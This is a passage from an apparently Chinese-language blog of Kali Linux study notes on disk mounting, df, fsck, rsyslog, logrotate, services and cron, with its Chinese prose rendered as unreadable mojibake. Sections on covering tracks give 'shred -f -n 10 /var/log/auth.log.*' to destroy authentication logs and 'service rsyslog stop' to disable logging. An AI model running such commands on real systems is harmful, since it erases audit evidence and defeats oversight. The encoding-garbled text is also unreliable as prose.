sr0ï¼Œå°½ç®¡æˆ‘çš„ç³»ç»Ÿä¸Šæ²¡æœ‰è½¯ç›˜é©±åŠ¨å™¨ï¼Œè¿™åªæ˜¯æ—§ç³»ç»Ÿçš„ é—ç•™ã€‚æˆ‘ä»¬è¿˜å¯ä»¥åœ¨é©±åŠ¨å™¨çš„æŒ‚è½½ç‚¹ä¸Šçœ‹åˆ°ä¿¡æ¯â€”â€”è¿™æ˜¯é©±åŠ¨å™¨é™„åŠ åˆ°æ–‡ä»¶ç³»ç»Ÿçš„ä½ç½®ã€‚è¯·æ³¨æ„ï¼Œç¡¬ç›˜é©± åŠ¨å™¨ sda1 å®‰è£…åœ¨/ç›®å½•å’Œé—ªå­˜é©±åŠ¨å™¨å®‰è£…åœ¨/media ç›®å½•ã€‚</p><h3 id="è‡ªå·±å®‰è£…å­˜å‚¨è®¾å¤‡"><a href="#è‡ªå·±å®‰è£…å­˜å‚¨è®¾å¤‡" class="headerlink" title="è‡ªå·±å®‰è£…å­˜å‚¨è®¾å¤‡"></a>è‡ªå·±å®‰è£…å­˜å‚¨è®¾å¤‡</h3><p>mount  /dev/sdb1  /mnt         å°†æ–°ç¡¬ç›˜ sdb1 æŒ‚è½½åˆ°/mnt ç›®å½•</p><h3 id="å¸è½½ä¸-umount"><a href="#å¸è½½ä¸-umount" class="headerlink" title="å¸è½½ä¸ umount"></a>å¸è½½ä¸ umount</h3><p>umount  /dev/sdb1 </p><h3 id="è·å–æŒ‚è½½ç£ç›˜ä¸Šçš„ä¿¡æ¯"><a href="#è·å–æŒ‚è½½ç£ç›˜ä¸Šçš„ä¿¡æ¯" class="headerlink" title="è·å–æŒ‚è½½ç£ç›˜ä¸Šçš„ä¿¡æ¯"></a>è·å–æŒ‚è½½ç£ç›˜ä¸Šçš„ä¿¡æ¯</h3><p>å‘½ä»¤ df(å¯¹äºç©ºä½™ç£ç›˜)å°†ä¸ºæˆ‘ä»¬æä¾›å…³äºä»»ä½•ç¡¬ç›˜æˆ–æŒ‚è½½è®¾å¤‡(å¦‚ CDã€DVD å’Œé—ªå­˜é©±åŠ¨å™¨)çš„åŸºæœ¬ä¿¡æ¯ï¼Œ åŒ…æ‹¬æ­£åœ¨ä½¿ç”¨çš„ç©ºé—´å’Œå¯ç”¨ç©ºé—´(å‚è§æ¸…å• 10-4)ã€‚å¦‚æœæ²¡æœ‰ä»»ä½•é€‰é¡¹ï¼Œdf é»˜è®¤ä¸ºç³»ç»Ÿä¸Šçš„ç¬¬ä¸€ä¸ªé©±åŠ¨å™¨(åœ¨ æœ¬ä¾‹ä¸­æ˜¯ sda)ã€‚å¦‚æœæ‚¨æƒ³æ£€æŸ¥å¦ä¸€ä¸ªé©±åŠ¨å™¨ï¼Œåªéœ€ä½¿ç”¨æ‚¨æƒ³æ£€æŸ¥çš„é©±åŠ¨å™¨è¡¨ç¤ºå½¢å¼(ä¾‹å¦‚ï¼Œdf sdb)éµå¾ª df å‘½ ä»¤å³å¯ã€‚ </p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;df  </span><br><span class="line">Filesystem <span class="number">1</span>K-Blocks Used Available Use% Mounted on </span><br><span class="line">rootfs <span class="number">19620732</span>    <span class="number">17096196</span> <span class="number">1504788</span> <span class="number">92</span>% / </span><br><span class="line">udev  <span class="number">10240</span> <span class="number">0</span> <span class="number">10240</span>   <span class="number">0</span>% /dev  </span><br><span class="line">Â­Â­snip--   </span><br><span class="line"> </span><br><span class="line">/dev/sdb1 <span class="number">29823024</span>  <span class="number">29712544</span> <span class="number">110480</span>  <span class="number">99</span>% /media/USB3<span class="number">.0</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ç¬¬ä¸€è¡Œè¾“å‡ºæˆ‘ä»¬å¾—åˆ°çš„ä¿¡æ¯æ˜¾ç¤ºç±»åˆ«æ ‡é¢˜ï¼Œç£ç›˜ç©ºé—´ä»¥ 1KB å—çš„å½¢å¼ç»™å‡ºã€‚åœ¨ç¬¬äºŒè¡Œï¼Œæˆ‘ä»¬çœ‹ åˆ° rootfs æœ‰ 19,620,732 ä¸ª 1 åƒå­—èŠ‚çš„å—ï¼Œå…¶ä¸­ä½¿ç”¨äº† 17,096,196 ä¸ªå—(çº¦å  92%)ï¼Œå‰©ä¸‹ 1,504,788 ä¸ªå¯ç”¨ã€‚ df å‘½ä»¤è¿˜å‘Šè¯‰æˆ‘ä»¬è¿™ä¸ªæ–‡ä»¶ç³»ç»Ÿå®‰è£…åœ¨æ–‡ä»¶ç³»ç»Ÿ/æ ¹ç›®å½•ã€‚<br>åœ¨æœ€åä¸€è¡Œï¼Œä½ å¯ä»¥çœ‹åˆ°æˆ‘çš„ u ç›˜ã€‚æ³¨æ„ï¼Œå®ƒè¢«æŒ‡å®šä¸º/dev/sdb1ï¼Œå‡ ä¹ 100%å·²æ»¡ï¼ŒæŒ‚è½½åœ¨/media/USB3.0ã€‚<br>ç»¼ä¸Šæ‰€è¿°ï¼Œæˆ‘åœ¨è¿™ä¸ªç³»ç»Ÿä¸Šçš„è™šæ‹Ÿç£ç›˜è¢«æŒ‡å®šä¸º sda1ï¼Œå®ƒçš„ä¿¡æ¯å¦‚ä¸‹:<br>sd SATA ç¡¬ç›˜<br>ä¸€ä¸ªç¡¬ç›˜é©±åŠ¨å™¨<br>é©±åŠ¨å™¨ä¸Šçš„ç¬¬ä¸€ä¸ªåˆ†åŒº </p><p>æˆ‘çš„ 64GB é—ªå­˜é©±åŠ¨å™¨æŒ‡å®šä¸º sdb1ï¼Œæˆ‘çš„å¤–éƒ¨é©±åŠ¨å™¨æŒ‡å®šä¸º sdc1</p><h3 id="æ£€æŸ¥é”™è¯¯"><a href="#æ£€æŸ¥é”™è¯¯" class="headerlink" title="æ£€æŸ¥é”™è¯¯"></a>æ£€æŸ¥é”™è¯¯</h3><p>fsck å‘½ä»¤(æ–‡ä»¶ç³»ç»Ÿæ£€æŸ¥çš„ç¼©å†™)æ£€æŸ¥æ–‡ä»¶ç³»ç»Ÿçš„é”™è¯¯å¹¶ä¿®å¤æŸå(å¦‚æœå¯èƒ½çš„è¯)ï¼Œæˆ–è€…å°†é”™è¯¯åŒºåŸŸæ”¾å…¥ ä¸€ä¸ªé”™è¯¯å—è¡¨ä¸­ï¼Œå°†å…¶æ ‡è®°ä¸ºé”™è¯¯ã€‚è¦è¿è¡Œ fsck å‘½ä»¤ï¼Œéœ€è¦æŒ‡å®šæ–‡ä»¶ç³»ç»Ÿç±»å‹(é»˜è®¤ä¸º ext2)å’Œè¦æ£€æŸ¥çš„è®¾ å¤‡æ–‡ä»¶ã€‚é‡è¦çš„æ˜¯ï¼Œåœ¨è¿è¡Œæ–‡ä»¶ç³»ç»Ÿæ£€æŸ¥ä¹‹å‰ï¼Œå¿…é¡»å¸è½½é©±åŠ¨å™¨ã€‚</p><p>å› æ­¤ï¼Œæ‰§è¡Œæ–‡ä»¶ç³»ç»Ÿæ£€æŸ¥çš„ç¬¬ä¸€æ­¥æ˜¯å¸è½½è®¾å¤‡ã€‚</p><p>kali &gt;umount  /dev/sdb1 </p><p>æˆ‘å¯ä»¥æ·»åŠ -p é€‰é¡¹ï¼Œè®© fsck è‡ªåŠ¨ä¿®å¤</p><p>kali &gt;fsck  -p  /dev/sdb1 </p><p>åœ¨è®¾å¤‡å¸è½½åï¼Œæˆ‘ç°åœ¨å¯ä»¥æ£€æŸ¥è®¾å¤‡çš„ä»»ä½•åæ‰‡åŒºæˆ–å…¶ä»–é—®é¢˜ï¼Œå¦‚ä¸‹: </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;fsck  -p  /dev/sdb1  </span><br><span class="line">fsck <span class="keyword">from</span> util-linux 2.30.2  </span><br><span class="line">exfatfsck 1.2.7 </span><br><span class="line">Checking file<span class="built_in"> system </span>on /dev/sdb1.  </span><br><span class="line">File<span class="built_in"> system </span>version 1.0 </span><br><span class="line">Sector size 512 bytes </span><br><span class="line">Cluster size 32 KB </span><br><span class="line">Volume size 7648 MB </span><br><span class="line">Used space 1265 MB </span><br><span class="line">Available space 6383 MB  </span><br><span class="line">Totally 20 directories <span class="keyword">and</span> 111 files. </span><br><span class="line">File<span class="built_in"> system </span>checking finished. <span class="literal">No</span> errors found.</span><br></pre></td></tr></table></figure><h2 id="æ—¥å¿—ç³»ç»Ÿ"><a href="#æ—¥å¿—ç³»ç»Ÿ" class="headerlink" title="æ—¥å¿—ç³»ç»Ÿ"></a>æ—¥å¿—ç³»ç»Ÿ</h2><p>Linux ä½¿ç”¨ä¸€ä¸ªåä¸º syslogd çš„å®ˆæŠ¤è¿›ç¨‹æ¥è‡ªåŠ¨è®°å½•è®¡ç®—æœºä¸Šçš„äº‹ä»¶ã€‚syslog çš„å‡ ä¸ªå˜ä½“ï¼ŒåŒ…æ‹¬ rsyslog å’Œ syslog-ng</p><h3 id="rsyslogæ—¥å¿—è®°å½•è§„åˆ™"><a href="#rsyslogæ—¥å¿—è®°å½•è§„åˆ™" class="headerlink" title="rsyslogæ—¥å¿—è®°å½•è§„åˆ™"></a>rsyslogæ—¥å¿—è®°å½•è§„åˆ™</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">###############  </span><br><span class="line">#### RULES ####  </span><br><span class="line">###############  </span><br><span class="line"># </span><br><span class="line"><span class="number">117</span> </span><br><span class="line"># First some standard log files. Log by facility.  </span><br><span class="line"># </span><br><span class="line">auth,authpriv.* /var/log/auth.log </span><br><span class="line">*.*Í¾auth,authpriv.none -/var/log/syslog  </span><br><span class="line">#cron.* /var/log/cron.log </span><br><span class="line">daemon.*  -/var/log/daemon.log  </span><br><span class="line">kern.* -/var/log/kern.log </span><br><span class="line"><span class="number">1</span>pr.* -/var/log/lpr.log </span><br><span class="line">mail.* -/var/log/mail.log </span><br><span class="line">user.* -/var/log/user.log </span><br><span class="line"> </span><br><span class="line"># </span><br><span class="line"># Logging for the mail <span class="keyword">system</span>. Split it up so that  </span><br><span class="line"># it is easy to write scripts to parse these files. </span><br><span class="line"># </span><br><span class="line">mail.info -/var/log/mail.info </span><br><span class="line">mail.warn -/var/log/mail.warn </span><br><span class="line">mail.err /var/log/mail.err</span><br></pre></td></tr></table></figure><p>æ¯ä¸€è¡Œéƒ½æ˜¯ä¸€ä¸ªå•ç‹¬çš„æ—¥å¿—è®°å½•è§„åˆ™ï¼Œè¯´æ˜è®°å½•äº†å“ªäº›æ¶ˆæ¯ä»¥åŠè®°å½•åˆ°å“ªé‡Œã€‚è¿™äº›è§„åˆ™çš„åŸºæœ¬æ ¼å¼å¦‚<br>ä¸‹: </p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">facility.<span class="built_in">priority</span> <span class="built_in">action</span></span><br></pre></td></tr></table></figure><p> facility å…³é”®å­—å¼•ç”¨æ­£åœ¨è®°å½•å…¶æ¶ˆæ¯çš„ç¨‹åºï¼Œä¾‹å¦‚é‚®ä»¶ã€å†…æ ¸æˆ–æ‰“å°ç³»ç»Ÿã€‚priority å…³é”®å­—å†³å®šä¸ºè¯¥ç¨‹åº è®°å½•å“ªç§ç±»å‹çš„æ¶ˆæ¯ã€‚åœ¨æœ€å³è¾¹çš„ action å…³é”®å­—å¼•ç”¨å°†å‘é€æ—¥å¿—çš„ä½ç½®ã€‚è®©æˆ‘ä»¬æ›´ä»”ç»†åœ°çœ‹ä¸€ä¸‹æ¯ä¸ªéƒ¨åˆ†ï¼Œ é¦–å…ˆæ˜¯ facility å…³é”®å­—ï¼Œå®ƒæŒ‡çš„æ˜¯ç”Ÿæˆæ—¥å¿—çš„ä»»ä½•è½¯ä»¶ï¼Œæ— è®ºæ˜¯å†…æ ¸ã€é‚®ä»¶ç³»ç»Ÿè¿˜æ˜¯ç”¨æˆ·ã€‚ </p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„ä»£ç åˆ—è¡¨ï¼Œå¯ä»¥ç”¨æ¥ä»£æ›¿æˆ‘ä»¬çš„é…ç½®æ–‡ä»¶è§„åˆ™ä¸­çš„å…³é”®å­— facility:<br>auth/authpriv å®‰å…¨/æˆæƒæ¶ˆæ¯<br>cron æ—¶é’Ÿå®ˆæŠ¤è¿›ç¨‹<br>daemon å…¶ä»–å®ˆæŠ¤è¿›ç¨‹<br>kern å†…æ ¸æ¶ˆæ¯<br>118<br>lpr æ‰“å°ç³»ç»Ÿ<br>mail é‚®ä»¶ç³»ç»Ÿ<br>user å¸¸è§„ç”¨æˆ·çº§åˆ«æ¶ˆæ¯ </p><p>æ˜Ÿå·é€šé…ç¬¦ï¼ˆ*ï¼‰ä»£æ›¿å•è¯æŒ‡çš„æ˜¯æ‰€æœ‰ä¿¡æ¯ã€‚ æ‚¨å¯ä»¥é€šè¿‡ä»¥é€—å·åˆ†éš”çš„åˆ—è¡¨æ¥é€‰æ‹©å¤šä¸ªã€‚<br>ä¼˜å…ˆçº§å‘Šè¯‰ç³»ç»Ÿè¦è®°å½•å“ªç§æ¶ˆæ¯ã€‚ä»£ç ä»æœ€ä½ä¼˜å…ˆçº§åˆ—å‡ºï¼Œä»è°ƒè¯•å¼€å§‹åˆ°æœ€é«˜ä¼˜å…ˆçº§ï¼Œä»¥ä¸¥é‡ç»“æŸã€‚ å¦‚æœä¼˜å…ˆçº§ä¸º*ï¼Œåˆ™è®°å½•æ‰€æœ‰ä¼˜å…ˆçº§çš„æ¶ˆæ¯ã€‚æŒ‡å®šä¼˜å…ˆçº§æ—¶ï¼Œå°†è®°å½•è¯¥ä¼˜å…ˆçº§åŠæ›´é«˜ä¼˜å…ˆçº§çš„æ¶ˆæ¯ã€‚ä¾‹å¦‚ï¼Œ å¦‚æœæŒ‡å®šçš„ä¼˜å…ˆçº§ä»£ç ä¸ºå‘Šè­¦ alertï¼Œç³»ç»Ÿå°†è®°å½•åˆ†ç±»ä¸ºå‘Šè­¦å’Œæ›´é«˜ä¼˜å…ˆçº§çš„æ¶ˆæ¯ï¼Œä½†ä¸ä¼šè®°å½•æ ‡è®°ä¸º crit çš„æ¶ˆæ¯æˆ–ä½äºè­¦æŠ¥çš„ä»»ä½•ä¼˜å…ˆçº§ã€‚ä»¥ä¸‹æ˜¯æœ‰æ•ˆä¼˜å…ˆçº§ä»£ç çš„å®Œæ•´åˆ—è¡¨ï¼š </p><p>â€¢ debug </p><p>â€¢ info </p><p>â€¢ notice</p><p>â€¢ warning </p><p>â€¢ warn </p><p>â€¢ error </p><p>â€¢ err </p><p>â€¢ crit </p><p>â€¢ alert </p><p>â€¢ emerg </p><p>â€¢ panic<br>warningã€warnã€errorã€errã€emergã€panicï¼Œè¿™äº›éƒ½å·²è¢«å¼ƒç”¨ï¼Œä¸åº”è¯¥ä½¿ç”¨ã€‚ </p><p>æ“ä½œé€šå¸¸æ˜¯ä¸€ä¸ªæ–‡ä»¶åå’Œåº”è¯¥å‘é€æ—¥å¿—çš„ä½ç½®ã€‚æ³¨æ„ï¼Œé€šå¸¸ï¼Œæ—¥å¿—æ–‡ä»¶è¢«å‘é€åˆ°/var/log ç›®å½•ï¼Œå…¶æ–‡ä»¶ åæè¿°ä¸ºç”Ÿæˆå®ƒä»¬çš„å·¥å…·ï¼Œå¦‚ authã€‚è¿™æ„å‘³ç€ï¼Œä¾‹å¦‚ï¼Œç”± auth å·¥å…·ç”Ÿæˆçš„æ—¥å¿—å°†è¢«å‘é€åˆ°/var/log.auth.logã€‚<br>è®©æˆ‘ä»¬çœ‹ä¸€äº›æ—¥å¿—è§„åˆ™çš„ä¾‹å­: </p><p>mail.* /var/log/mail<br>è¿™ä¸ªç¤ºä¾‹å°†æ‰€æœ‰(*)ä¼˜å…ˆçº§çš„é‚®ä»¶äº‹ä»¶è®°å½•åˆ°/var/log/mail æ–‡ä»¶ä¸­ã€‚ </p><p>kern.crit /var/log/kernel<br>è¿™ä¸ªä¾‹å­å°†æŠŠå±é™©(crit)ä¼˜å…ˆçº§æˆ–æ›´é«˜çš„å†…æ ¸äº‹ä»¶è®°å½•åˆ°/var/log/kernel ä¸­ã€‚ </p><p>*.emerg *<br>æœ€åä¸€ä¸ªç¤ºä¾‹å°†è®°å½•æ‰€æœ‰ç™»å½•ç”¨æˆ·çš„ç´§æ€¥äº‹ä»¶(emerg)ä¼˜å…ˆçº§çš„æ‰€æœ‰äº‹ä»¶ã€‚</p><p>é€šè¿‡è¿™äº›è§„åˆ™ï¼Œé»‘å®¢å¯ä»¥ç¡® å®šæ—¥å¿—æ–‡ä»¶çš„ä½ç½®ã€æ›´æ”¹ä¼˜å…ˆçº§ï¼Œç”šè‡³ç¦ç”¨ç‰¹å®šçš„æ—¥å¿—è§„åˆ™ã€‚ </p><h3 id="ä½¿ç”¨-LOGROTATE-è‡ªåŠ¨æ¸…ç†æ—¥å¿—"><a href="#ä½¿ç”¨-LOGROTATE-è‡ªåŠ¨æ¸…ç†æ—¥å¿—" class="headerlink" title="ä½¿ç”¨ LOGROTATE è‡ªåŠ¨æ¸…ç†æ—¥å¿—"></a>ä½¿ç”¨ LOGROTATE è‡ªåŠ¨æ¸…ç†æ—¥å¿—</h3><p>/etc/logrotate.conf </p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># see <span class="string">"man logrotate"</span> <span class="keyword">for</span> details  </span><br><span class="line"># <span class="keyword">rotate</span> <span class="keyword">log</span> files weekly </span><br><span class="line">âŠ weekly </span><br><span class="line"> </span><br><span class="line"># <span class="keyword">keep</span> 4 weeks worth of backlogs </span><br><span class="line">â‹ <span class="keyword">rotate</span> 4 </span><br><span class="line"> </span><br><span class="line">âŒ # create new (empty) <span class="keyword">log</span> files after rotating old ones  </span><br><span class="line">create </span><br><span class="line"> </span><br><span class="line">â # uncomment this <span class="keyword">if</span> you want your <span class="keyword">log</span> files compressed  </span><br><span class="line">#<span class="keyword">compress</span> </span><br><span class="line"> </span><br><span class="line"># packages <span class="keyword">drop</span> <span class="keyword">log</span> rotation information into this directory  </span><br><span class="line"><span class="keyword">include</span> /etc/logrotate.<span class="keyword">d</span> </span><br><span class="line"> </span><br><span class="line"># <span class="keyword">no</span> packages own wtmp, or btmp -- we'll <span class="keyword">rotate</span> them here </span><br><span class="line">/<span class="keyword">var</span>/<span class="keyword">log</span>/wtmp  </span><br><span class="line"> &#123;   missingok  </span><br><span class="line"> monthly </span><br><span class="line"> create 0664 root utmp  </span><br><span class="line">120 </span><br><span class="line"> <span class="keyword">rotate</span> 1 </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ï¼Œä½ å¯ä»¥è®¾ç½®çš„æ—¶é—´å•ä½æ•°å­—å‚è€ƒâŠã€‚è¿™é‡Œçš„é»˜è®¤å€¼æ˜¯ weeklyï¼Œè¿™æ„å‘³ç€ rotate å…³é”®å­—ä¹‹åçš„ä»» ä½•æ•°å­—æ€»æ˜¯æŒ‡ weeksï¼ˆå‘¨ï¼‰ ã€‚<br>è¿›ä¸€æ­¥å¾€ä¸‹çœ‹ï¼Œä½ å¯ä»¥çœ‹åˆ°è®¾ç½®åˆ‡å‰²è½¬å‚¨æ—¥å¿—é»˜è®¤è®¾ç½®çš„é¢‘ç‡æ˜¯æ¯å››ä¸ªæ˜ŸæœŸè½¬å‚¨æ—¥å¿—â‹ã€‚è¿™ä¸ªé»˜è®¤é… ç½®å¯¹å¤§å¤šæ•°äººéƒ½é€‚ç”¨ï¼Œä½†æ˜¯å¦‚æœæ‚¨æƒ³è®©æ‚¨çš„æ—¥å¿—æ›´é•¿ä¸€äº›ï¼Œä»¥ä¾¿è¿›è¡Œè°ƒæŸ¥ï¼Œæˆ–è€…æ›´çŸ­ä¸€äº›ï¼Œä»¥ä¾¿æ›´å¿«åœ°æ¸… é™¤å®ƒä»¬ï¼Œé‚£ä¹ˆæ‚¨åº”è¯¥æ›´æ”¹è¿™ä¸ªè®¾ç½®ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨æ¯å‘¨æ£€æŸ¥æ—¥å¿—æ–‡ä»¶å¹¶å¸Œæœ›èŠ‚çœå­˜å‚¨ç©ºé—´ï¼Œå¯ä»¥å°†æ­¤è®¾ç½® æ›´æ”¹ä¸º rotate 1ã€‚å¦‚æœæ‚¨çš„æ—¥å¿—æœ‰è¶³å¤Ÿçš„å­˜å‚¨ç©ºé—´ï¼Œå¹¶ä¸”å¸Œæœ›ä¿ç•™åŠæ°¸ä¹…è®°å½•ä»¥ä¾¿ä»¥åè¿›è¡Œå–è¯åˆ†æï¼Œé‚£ä¹ˆ æ‚¨å¯ä»¥å°†æ­¤è®¾ç½®æ›´æ”¹ä¸º rotate 26 ä»¥ä¿å­˜å…­ä¸ªæœˆçš„æ—¥å¿—ï¼Œæˆ–è€…å°† rotate 52 æ›´æ”¹ä¸ºä¿å­˜ä¸€å¹´çš„æ—¥å¿—ã€‚<br>é»˜è®¤æƒ…å†µä¸‹ï¼Œåˆ›å»ºä¸€ä¸ªæ–°çš„ç©ºæ—¥å¿—æ–‡ä»¶å½“åšæ—§æ—¥å¿—çš„åˆ‡å‰²å¤‡ä»½âŒã€‚åœ¨é…ç½®æ–‡ä»¶ä¸­å»ºè®®ï¼Œä½ ä¹Ÿå¯ä»¥é€‰æ‹© å‹ç¼©è½¬å‚¨çš„æ—¥å¿—æ–‡ä»¶âã€‚ </p><p>åœ¨æ¯ä¸ªè½¬å‚¨å‘¨æœŸç»“æŸæ—¶ï¼Œå°†é‡å‘½åæ—¥å¿—æ–‡ä»¶ï¼Œå¹¶åœ¨åˆ›å»ºæ–°æ—¥å¿—æ–‡ä»¶æ—¶å°†å…¶æ¨åˆ°æ—¥å¿—é“¾çš„æœ«å°¾ï¼Œä»¥æ›¿æ¢ å½“å‰æ—¥å¿—æ–‡ä»¶ã€‚ä¾‹å¦‚ï¼Œ/var/log.auth å°†å˜æˆ/var/log.auth.1ï¼Œé‚£ä¹ˆ/var/log.auth.2ï¼Œä»¥æ­¤ç±»æ¨ã€‚å¦‚æœæ‚¨æ¯å››å‘¨ è½®æ¢ä¸€æ¬¡æ—¥å¿—ï¼Œå¹¶ä¿ç•™å››ç»„å¤‡ä»½ï¼Œé‚£ä¹ˆæ‚¨å°†å¾—åˆ°/var/log.auth.4ï¼Œä½†æ˜¯æ²¡æœ‰/var/log.auth.5ã€‚æ„æ€æ˜¯æ—§çš„ /var/log.auth.4 å°†è¢«åˆ é™¤ï¼Œè€Œä¸æ˜¯è¢«æ¨åˆ°/var/log/auth.5</p><h3 id="åˆ é™¤è¯æ®"><a href="#åˆ é™¤è¯æ®" class="headerlink" title="åˆ é™¤è¯æ®"></a>åˆ é™¤è¯æ®</h3><p>shred å°†åˆ é™¤æ–‡ä»¶å¹¶å¤šæ¬¡è¦†ç›–å®ƒâ€”â€”é»˜è®¤æƒ…å†µä¸‹ï¼Œshred å°†è¦†ç›– 4 æ¬¡ã€‚é€šå¸¸ï¼Œæ–‡ä»¶è¢« è¦†ç›–çš„æ¬¡æ•°è¶Šå¤šï¼Œæ¢å¤èµ·æ¥å°±è¶Šå›°éš¾ï¼Œä½†æ˜¯è¯·è®°ä½ï¼Œæ¯æ¬¡è¦†ç›–éƒ½éœ€è¦æ—¶é—´ï¼Œå› æ­¤å¯¹äºéå¸¸å¤§çš„æ–‡ä»¶ï¼Œç¢ç‰‡ åŒ–å¯èƒ½ä¼šå¾ˆè€—æ—¶ã€‚ </p><p>è¦åŒ…æ‹¬ä¸¤ä¸ªæœ‰ç”¨çš„é€‰é¡¹ï¼Œä¸€ä¸ªæ˜¯-f é€‰é¡¹ï¼Œå®ƒæ›´æ”¹æ–‡ä»¶çš„æƒé™ï¼Œä»¥ä¾¿åœ¨éœ€è¦æ›´æ”¹æƒé™æ—¶å…è®¸è¦†ç›–ï¼›å¦ä¸€ ä¸ªæ˜¯-n é€‰é¡¹ï¼Œå®ƒå…è®¸æ‚¨é€‰æ‹©è¦†ç›–æ–‡ä»¶çš„æ¬¡æ•°ã€‚</p><p>ä¾‹å¦‚ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å°†/var/log/auth.log ä¸­çš„æ—¥å¿—æ–‡ä»¶ åˆ†è§£è¦†ç›– 10 æ¬¡: </p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;shred  -f  -<span class="built_in">n</span>  <span class="number">10</span>  /<span class="built_in">var</span>/<span class="built_in">log</span>/auth.log.*</span><br></pre></td></tr></table></figure><h3 id="ç¦ç”¨æ—¥å¿—è®°å½•"><a href="#ç¦ç”¨æ—¥å¿—è®°å½•" class="headerlink" title="ç¦ç”¨æ—¥å¿—è®°å½•"></a>ç¦ç”¨æ—¥å¿—è®°å½•</h3><p>éœ€è¦rootæƒé™</p><p>service  rsyslog  stop </p><h2 id="ç†Ÿç»ƒä½¿ç”¨æœåŠ¡"><a href="#ç†Ÿç»ƒä½¿ç”¨æœåŠ¡" class="headerlink" title="ç†Ÿç»ƒä½¿ç”¨æœåŠ¡"></a>ç†Ÿç»ƒä½¿ç”¨æœåŠ¡</h2><p>å¯åŠ¨ã€åœæ­¢å’Œé‡æ–°å¯åŠ¨æœåŠ¡ </p><p>service servicename start|stop|restart </p><p>å¯¹é»‘å®¢ç‰¹åˆ«é‡è¦çš„å››ä¸ªï¼š</p><p><strong>Apache Web Serverï¼Œ</strong></p><p><strong>OpenSSHï¼Œ</strong></p><p><strong>MySQL ï¼Œ</strong></p><p><strong>PostgreSQL ç»“åˆ Metasploit  ã€‚</strong> </p><h2 id="ä½¿ç”¨ä½œä¸šè°ƒåº¦è‡ªåŠ¨åŒ–ä»»åŠ¡"><a href="#ä½¿ç”¨ä½œä¸šè°ƒåº¦è‡ªåŠ¨åŒ–ä»»åŠ¡" class="headerlink" title="ä½¿ç”¨ä½œä¸šè°ƒåº¦è‡ªåŠ¨åŒ–ä»»åŠ¡"></a>ä½¿ç”¨ä½œä¸šè°ƒåº¦è‡ªåŠ¨åŒ–ä»»åŠ¡</h2><p>éœ€è¦éµå¾ªçš„æ ¼å¼ï¼Œ</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">M   H  DOM  MON  DOW <span class="built_in"> USER </span> COMMAND </span><br><span class="line">30  2  * *   1-5  root  /root/myscanningscript</span><br></pre></td></tr></table></figure><p>leafpad  /etc/crontab </p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/crontab: system-wide crontab </span></span><br><span class="line"><span class="comment"># Unlike any other crontab, you don't have to run the 'crontab'  </span></span><br><span class="line"><span class="comment"># command to install the new version when you edit this file </span></span><br><span class="line"><span class="comment"># and files in /etc/cron.d. These files also have username fields,  </span></span><br><span class="line"><span class="comment"># which no other crontabs do. </span></span><br><span class="line"> </span><br><span class="line">SHELL=<span class="regexp">/bin/sh</span> PATH=<span class="regexp">/usr/local</span><span class="regexp">/sbin:/usr</span><span class="regexp">/local/bin</span><span class="symbol">:/sbin</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin</span><span class="symbol">:/usr/bin</span> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># m h dom mon dow user command </span></span><br><span class="line"><span class="number">17</span> * * * * root cd / &amp;&amp; run-parts --report /etc/cron.hourly </span><br><span class="line"><span class="number">25</span> <span class="number">6</span> * * * root test -x /usr/sbin/anacron II ( cd / &amp;&amp; run-parts  </span><br><span class="line"><span class="number">47</span> <span class="number">6</span> * * <span class="number">7</span> root test -x /usr/sbin/anacron II ( cd / &amp;&amp; run-parts  </span><br><span class="line"><span class="number">52</span> <span class="number">6</span> <span class="number">1</span> * * root test -x /usr/sbin/anacron II ( cd / &amp;&amp; 